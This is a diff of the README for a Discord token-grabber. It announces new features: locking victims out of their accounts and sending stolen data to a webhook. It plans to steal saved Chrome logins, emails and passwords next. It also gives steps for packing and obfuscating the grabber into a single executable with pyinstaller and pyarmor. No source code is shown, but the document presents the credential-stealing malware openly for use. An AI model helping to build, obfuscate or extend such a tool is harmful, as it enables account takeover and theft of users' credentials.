@@ -1,10 +1,14 @@
 # Discordapp TokenGrabber
-  - Deploying a v1.0 version soon, includes way more things than the actual one 
+  - 1.0 Deployed!
+   + **New ability: Locks the user completely out of his account**
+   + **New ability: Return data through a webhook**
+  - Whats next:
+   + **Send all the chrome data (login, email, password) through a webhook too**
 
 # How to compile
- - in command prompt: `pip install pyinstaller` & `pip install pyarmor`
- - then drag the token grabber to the desktop and do `cd desktop`
- - `pyarmor pack main.py` and you're good to go
+ - In CMD: `pip install pyinstaller` & `pip install pyarmor`
+ - Drag the main.py file to the desktop and in CMD do `cd desktop`
+ - Do `pyarmor pack -e " --onefile" main.py`, go to dist and grab your packed file!
 
 # The program outputs as:
 
